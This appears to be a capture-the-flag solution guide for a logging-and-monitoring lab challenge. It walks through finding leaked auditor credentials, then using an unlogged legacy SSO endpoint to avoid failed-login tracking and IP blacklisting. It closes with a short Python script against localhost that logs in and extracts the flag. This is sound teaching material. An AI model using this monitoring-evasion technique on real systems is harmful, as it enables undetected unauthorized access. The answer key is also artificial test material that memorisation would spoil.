# A09 Easy: Solution Guide

### Vulnerability Analysis
1. Browse to `/compliance` to discover auditor username `sec_auditor` and password `Auditor2026!`.
2. Notice in `/siem/monitor` that attempts on `/login` are strictly tracked, and 3 failed attempts will blacklist the attacker IP.
3. Inspect `/api/v1/docs` to discover the unlogged legacy endpoint:
   - `POST /api/v1/sso/partner-auth`
4. The partner authentication endpoint validates credentials without generating any entries in `SIEM_EVENTS` or updating failure counters.
5. Authenticate via `/api/v1/sso/partner-auth`, then navigate to `/auditor/vault` to obtain the dynamic flag.

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6025"
s = requests.Session()

# Authenticate via unlogged partner endpoint
resp = s.post(f"{BASE_URL}/api/v1/sso/partner-auth", json={
    "username": "sec_auditor",
    "password": "Auditor2026!"
})
assert resp.json().get("success") is True

# Retrieve flag from vault
vault_resp = s.get(f"{BASE_URL}/auditor/vault")
flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
